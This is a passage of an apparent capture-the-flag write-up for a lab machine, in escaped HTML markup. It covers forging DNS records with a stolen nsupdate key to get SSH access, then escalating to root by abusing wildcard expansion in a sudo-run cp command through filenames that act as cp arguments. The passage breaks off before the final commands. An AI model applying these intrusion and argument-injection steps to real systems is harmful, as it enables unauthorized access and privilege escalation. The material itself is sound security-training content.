+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;PHP_AUTH_USER&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;:&quot;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;PHP_AUTH_PW&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!==&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;dynadns:sndanyd&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;badauth&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+  &lt;span class=&quot;c1&quot;&gt;// Set $myip from GET, defaulting to REMOTE_ADDR&lt;/span&gt;
+  &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;REMOTE_ADDR&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;filter_var&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;myip&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;no&quot;&gt;FILTER_VALIDATE_IP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;                       &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$valid&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;isset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hostname&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// Check for a valid domain&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;explode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;.&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;hostname&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$validds&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;dnsalias.htb&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;dynamicdns.htb&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;no-ip.htb&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;in_array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$validds&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;911 [wrngdom: &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// Update DNS entry&lt;/span&gt;
+    &lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sprintf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;server 127.0.0.1&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;zone %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;update delete %s.%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;update add %s.%s 30 IN A %s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$h&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$d&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;echo &quot;&apos;&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$cmd&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;&quot; | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$retval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+    &lt;span class=&quot;c1&quot;&gt;// Return good or 911&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$retval&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;good &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+      &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;911 [nsupdate failed]&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;else&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;nochg &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myip&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Furthermore, it looks like the hostname restriction is just performed in this PHP file, so if we can bypass the file and directly execute the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nsupdate&lt;/code&gt; command, maybe we can get ourself assigned to a correct domain that is allowed logging in.&lt;/p&gt;
+
+&lt;p&gt;It looks like there’s a key file referenced in the PHP script called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bind/ddns.key&lt;/code&gt;, so taking a look at the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bind&lt;/code&gt; directory, there are a few other interesting files:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; /etc/bind
+...
+ddns.key
+infra.key
+rndc.key
+...
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Since we want a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*.infra.dyna.htb&lt;/code&gt; domain, I bet that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;infra.key&lt;/code&gt; file is what we will need to use.&lt;/p&gt;
+
+&lt;p&gt;After a bit more googling, I determined that what we need to do is update and create an A record, then assign our ip as a PTR to that record.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;nsupdate &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; /etc/bind/infra.key
+update add api.infra.dyna.htb 86400 A 10.10.14.5
+
+update add 5.14.10.10.in-addr.arpa 86400 PTR api.infra.dyna.htb
+show
+Outgoing update query:
+&lt;span class=&quot;p&quot;&gt;;;&lt;/span&gt; -&amp;gt;&amp;gt;HEADER&lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;-&lt;/span&gt; &lt;span class=&quot;no&quot;&gt;opcode&lt;/span&gt;&lt;span class=&quot;sh&quot;&gt;: UPDATE, status: NOERROR, id:      0
+;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
+;; UPDATE SECTION:
+5.14.10.10.in-addr.arpa. 86400  IN      PTR     api.infra.dyna.htb.
+
+send
+quit
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Now, back on our machine, we can attempt to log in&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ssh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; bindmgr bindmgr@no-ip.htb
+bindmgr@dynstr:/tmp/test&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Success! We now have user!!&lt;/p&gt;
+
+&lt;h1 id=&quot;privesc---root&quot;&gt;Privesc - Root&lt;/h1&gt;
+&lt;p&gt;Looking around as the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bindmgr&lt;/code&gt; user, I noticed that we can execute a command with sudo&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;: unable to resolve host dynstr.dyna.htb: Name or service not known
+Matching Defaults entries &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;bindmgr on dynstr:
+    env_reset, mail_badpass, &lt;span class=&quot;nv&quot;&gt;secure_path&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/sbin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/bin&lt;span class=&quot;se&quot;&gt;\:&lt;/span&gt;/snap/bin
+
+User bindmgr may run the following commands on dynstr:
+    &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ALL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; NOPASSWD: /usr/local/bin/bindmgr.sh
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So, this &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/local/bin/bindmgr.sh&lt;/code&gt; scrip can be executed, looking at the contents we have:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/usr/bin/bash&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# This script generates named.conf.bindmgr to workaround the problem&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# that bind/named can only include single files but no directories.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# It creates a named.conf.bindmgr file in /etc/bind that can be included&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# from named.conf.local (or others) and will include all files from the&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# directory /etc/bin/named.bindmgr.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# NOTE: The script is work in progress. For now bind is not including&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#       named.conf.bindmgr. &lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# TODO: Currently the script is only adding files to the directory but&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#       not deleting them. As we generate the list of files to be included&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#       from the source directory they won&apos;t be included anyway.&lt;/span&gt;
+
+&lt;span class=&quot;nv&quot;&gt;BINDMGR_CONF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/bind/named.conf.bindmgr
+&lt;span class=&quot;nv&quot;&gt;BINDMGR_DIR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/etc/bind/named.bindmgr
+
+indent&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;s/^/    /&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Check versioning (.version)&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Running &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$0&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; to stage new configuration from &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PWD&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&quot;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-f&lt;/span&gt; .version &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[-] ERROR: Check versioning. Exiting.&quot;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;42
+&lt;span class=&quot;k&quot;&gt;fi
+if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .version 2&amp;gt;/dev/null&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-le&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$BINDMGR_DIR&lt;/span&gt;/.version 2&amp;gt;/dev/null&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[-] ERROR: Check versioning. Exiting.&quot;&lt;/span&gt;
+    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;43
+&lt;span class=&quot;k&quot;&gt;fi&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Create config file that includes all files from named.bindmgr.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Creating &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BINDMGR_CONF&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt; file.&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;// Automatically generated file. Do not modify manually.\n&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$BINDMGR_CONF&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;file &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;printf&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;include &quot;/etc/bind/named.bindmgr/%s&quot;;\n&apos;&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$BINDMGR_CONF&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# Stage new version of configuration files.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Staging files to &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$BINDMGR_DIR&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;.&quot;&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; .version &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /etc/bind/named.bindmgr/
+
+&lt;span class=&quot;c&quot;&gt;# Check generated configuration with named-checkconf.&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Checking staged configuration.&quot;&lt;/span&gt;
+named-checkconf &lt;span class=&quot;nv&quot;&gt;$BINDMGR_CONF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/dev/null
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[-] ERROR: The generated configuration is not valid. Please fix following errors: &quot;&lt;/span&gt;
+    named-checkconf &lt;span class=&quot;nv&quot;&gt;$BINDMGR_CONF&lt;/span&gt; 2&amp;gt;&amp;amp;1 | indent
+    &lt;span class=&quot;nb&quot;&gt;exit &lt;/span&gt;44
+&lt;span class=&quot;k&quot;&gt;else 
+    &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Configuration successfully staged.&quot;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# *** TODO *** Uncomment restart once we are live.&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# systemctl restart bind9&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[[&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$?&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ne&lt;/span&gt; 0 &lt;span class=&quot;o&quot;&gt;]]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;then
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[-] Restart of bind9 via systemctl failed. Please check logfile: &quot;&lt;/span&gt;
+        systemctl status bind9
+    &lt;span class=&quot;k&quot;&gt;else
+        &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;[+] Restart of bind9 via systemctl succeeded.&quot;&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;fi
+fi&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Examining this script, it seems to first check for a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.version&lt;/code&gt; file in your current directory, then if it finds one, it will compare it to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bind/named.bindmgr/.version&lt;/code&gt;. If the version is higher, it will copy everything from the current directory to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/bind/named.bindmgr/&lt;/code&gt;&lt;/p&gt;
+
+&lt;p&gt;The issue with this is the copy command&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; .version &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; /etc/bind/named.bindmgr/
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt; here will simply take everything from the current directory and expand it on the CLI, so if we create a file with a name that is actually a CLI argument for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cp&lt;/code&gt;, that will get expanded and become an argument rather than a file. We can use this to our advantage to preserve permissions on a file that is being copied.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /tmp
